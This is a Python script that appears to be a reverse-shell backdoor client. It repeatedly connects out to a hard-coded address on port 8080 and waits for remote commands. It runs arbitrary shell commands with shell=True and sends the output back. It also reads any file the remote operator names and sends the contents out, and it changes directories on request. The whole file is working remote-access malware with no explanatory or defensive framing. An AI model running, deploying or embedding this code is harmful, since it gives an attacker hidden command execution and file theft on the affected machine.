import socket
import subprocess
import os
import time

def initiate():
    tuneConnection()

def tuneConnection():
    mySocket = socket.socket()
    while True:
        time.sleep(20)
        try:
            mySocket.connect(("10.0.0.68", 8080))
            shell(mySocket)

        except Exception as e:
            print(f"Error connecting: {e}")
            tuneConnection()

def letGrab(mySocket, path):
    if os.path.exists(path):
        with open(path, 'rb') as f:
            packet = f.read(5000)
            while len(packet) > 0:
                mySocket.send(packet)
                packet = f.read(5000)
        mySocket.send('Done'.encode())
    else:
        mySocket.send('File not Found'.encode())

def letSend(mySocket, path, fileName):
    if os.path.exists(path + fileName):
        with open(path + fileName, 'rb') as f:
            packet = f.read(5000)
            while len(packet) > 0:
                mySocket.send(packet)
                packet = f.read(5000)
        mySocket.send('DONE'.encode())
    else:
        mySocket.send('File not found'.encode())

def shell(mySocket):
    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())
                break

        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        elif 'send' in command.decode():
            send, path, fileName = command.decode().split("*")
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occurred. " + str(e)
                mySocket.send(informToServer.encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())

def main():
    initiate()

if __name__ == "__main__":
    main()
